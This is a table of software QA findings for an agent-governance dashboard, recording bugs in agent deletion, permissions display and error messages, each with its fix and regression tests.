| **372**                                      | `docs-notes/qa-sweep-2026-09-15/c13-deletion-leftovers.probe.test.ts.txt`; `mg/REMAINING-WORK-DASHBOARD-SWEEP.md` decision C13; plain language §5.117; design §3.5.90. **Medium. Recorded 2026-09-14 as a candidate, and proved 2026-09-15 by a probe on a real OpenClaw state directory (C13, option b).** Governance's _delete from host_ (`deprovisionAgent`) removes only the agent's roster entry (`deleteAgentConfigEntry`), then clears governance's own state for the id (T55). The agent's workspace files, its agent and session folders, its session database, its scheduled jobs and its host exec-approval settings all survived, and a new agent provisioned under the same id by a **different** Administrator received every one: the same default workspace path with the old file in it, the same session database, the old scheduled job and the old approval allowlist. OpenClaw's own `agents.delete` removes all of these. The gate still decides every action the new agent takes, so nothing inherited widens its permissions; what is exposed is the old agent's files and history, and its scheduled work runs under a new owner. **Fixed 2026-09-15 by decision C13** (design §3.5.91): deleting an agent asks which of two deletions to run. After the list-only delete, provisioning an agent under the name returns `hostLeftovers` and the dashboard says what it inherited; the full delete runs OpenClaw's own `agents.delete`, and an end-to-end test proves a new agent of the name then starts with nothing                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| **373**                                      | `mg/REMAINING-WORK.md` §"C13 decided"; plain language §5.118; design §3.5.91. **Low; upstream code.** Found 2026-09-15 by C13's end-to-end test, the first to run OpenClaw's `agents.delete` with files on a real Windows file system. `cleanupPathIdentity` (`src/gateway/server-methods/agents.ts`) read each folder's `dev` and `ino` as JavaScript numbers and threw _"cleanup path identity exceeds the safe integer range"_ past 2^53, because a rounded id could make two folders compare equal; NTFS file ids routinely exceed it (56,294,995,342,267,356 measured on the development machine), so OpenClaw's own delete refused whenever a folder it moved had a large id. Upstream's tests mock `node:fs/promises` and `fs-safe`, so none met a real id. Fixed: ids are read from bigint `lstat` and kept as exact decimal strings in the check and in the deletion journal (`agent-deletion-journal.ts`), and a rounded number is still refused; `fs-safe`'s `stat` rounds, so the identity is read beside it. Two regression tests in `agents-mutate.test.ts`: NTFS-sized ids delete, and a replacement whose id differs from the journal only past 2^53 is kept. That file's other 30 failures on Windows are identical at HEAD (POSIX path literals)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| **374**                                      | Same record; plain language §5.118; design §3.5.91. **Medium.** Found 2026-09-15 while building C13's refusals. The provision, deprovision and organisation-delete routes send `remedy` beside `message`, the next step an operator can take, and the dashboard client built its `GovernanceApiError` from `message` alone, which is what every panel shows. **No refusal's remedy had ever reached the screen.** The client now appends the remedy to the message (`ui/src/pages/governance/api.ts`), the one place the error is built, tested in `api.errors.test.ts`. The shape of findings 239 and 339: the server said what to do, and the page did not                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| **375**                                      | `mg/REMAINING-WORK.md` §"The QA over 2026-09-11 to 15, driven live"; plain language §5.119; design §3.5.92. **Low. Found 2026-09-18 by driving the dashboard as a second Administrator.** The agent registry drew **Allow/Disallow Codex** on `canAdminister` and **Remove…** on nothing but `agent.registered`, while `agents/codex`, `agents/unregister` and `agents/deprovision` admit only the owner and Root (`mayAdministerAgent`, 403 _"that agent belongs to another Administrator"_). A second Administrator was offered both controls on the first Administrator's agent, with the owner's name printed in the same row: findings 197, 247, 249 and 369's family, a control whose only outcome is a refusal. Fixed by `administersAgent` in `identity.ts` (Root, or the row's `adminUsername` matching the caller; an unnamed owner means only Root may act), which now gates both. Four tests and two mutations, each catching exactly the tests it should. **The first fix was wrong in a way only the live page showed**: gating Remove's branch left the _Register_ button, its `else`, on a registered agent, so the non-owner was offered registration instead. Restructured, re-tested with a Register assertion, and confirmed live as the owner, as a non-owner and as Root                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| **376**                                      | Same record; plain language §5.119; design §3.5.92. **Low. Found 2026-09-18 on the running Gateway**, deleting an agent the way OpenClaw does and then creating one under the same name. OpenClaw reported success and left `openclaw-agent.sqlite-shm` and `-wal` in the agent's folder, recreated by a handle that was still open, so the next agent of that name was told it had inherited "its agent folder" — while C13's own dialog promised that _"an agent created later with the same name starts with nothing"_. The leftovers clause (372's fix) reported it correctly; the promise was the false sentence. Fixed by reading what the delete left and reporting it beside the success (`deletedFullResidue`, the rule of finding 229), and by making the promise honest: nothing OpenClaw could remove, with anything left named here and again at the next creation. **The residue read races the recreation** and catches only what is already there, which the code says; the reliable report stays the creation-time clause                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| **377**                                      | `mg/REMAINING-WORK.md` §"The live QA of 2026-09-19, with a model connected"; plain language §5.120; design §3.5.93. **Low. Found 2026-09-19 in the Gateway's log while driving dashboard escalations live with a mock model.** After every escalation that ended without a person's answer (timed out, or its task cancelled), the agent's approval hook called `plugin.approval.reportOutcome`, which the Gateway accepts only for an approval somebody decided, so each one was refused and logged as _"plugin approval follow-up reporting failed"_. Nothing was lost: the Gateway releases its own hold for an undecided approval. But the log reported a failure on every unanswered escalation, which is the kind of false alarm an operator learns to ignore. T60's code (`778b769bef2`), not upstream's. Fixed at the caller: `notifyPluginApprovalResolution` in `agent-tools.before-tool-call.approval.ts` reports only `allow-once`, `allow-always` or `deny`, the set the Gateway accepts. A paired test in `agent-tools.before-tool-call.e2e.test.ts` (a timeout reports nothing; a person's deny still reports) was red before the fix, and removing the fix turns exactly that test red                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| **378**                                      | Same record; plain language §5.120; design §3.5.93. **Low. Found 2026-09-19 signed in as a Viewer with no agents.** Identity told a Viewer _"you can read the rule requests queue in full"_, and the Rule requests section was empty while the queue held three. `GET rule-requests` serves a Viewer the requests for its assigned agents and those binding every agent, unmasked, as decision C2 (finding 331) chose; "in full" was written to mean _unmasked_ and reads as _all of it_. Finding 331's own shape a second time: a sentence wider than the behaviour it describes. Fixed in the sentence (`canDoViewer`, `en-governance.ts`), not the route, since C2 decided the route. `identity-capability.test.ts` was red on the old sentence                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| **379**                                      | Same record; plain language §5.120; design §3.5.93. **Low. Found 2026-09-19 signed in as an Administrator.** _Request a change for one agent_ offered `main`, an agent OpenClaw has and governance never registered, because the Rule requests section listed every agent the page had heard of; `POST rule-requests` filed the request (it checked only `canManageAgent`, which an Administrator passes for any id); and approval refused it for ever, saying the agent _"has been deleted since this request was made"_, which was false. Findings 197, 247 and 375's family: a control whose only outcome is a refusal, here a delayed one. Fixed in three places: the route refuses a setting request for an agent not registered in the organisation (409 `agent_not_registered`, naming the fix; only Administrator and Root reach it, and both can read the registry, so no existence oracle); the section lists registered agents only (`registeredAgentIds`); and the approval refusal now says _"deleted since, or was never registered"_. **Left as designed:** a _rule_ request may still name an agent its requester does not manage, so a User can still file one for an unregistered name, refused at approval with the corrected wording; refusing it at filing would tell a User which agent ids exist. Tests red first in `governance-agent-setting-request.test.ts` and `agent-directory.test.ts`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
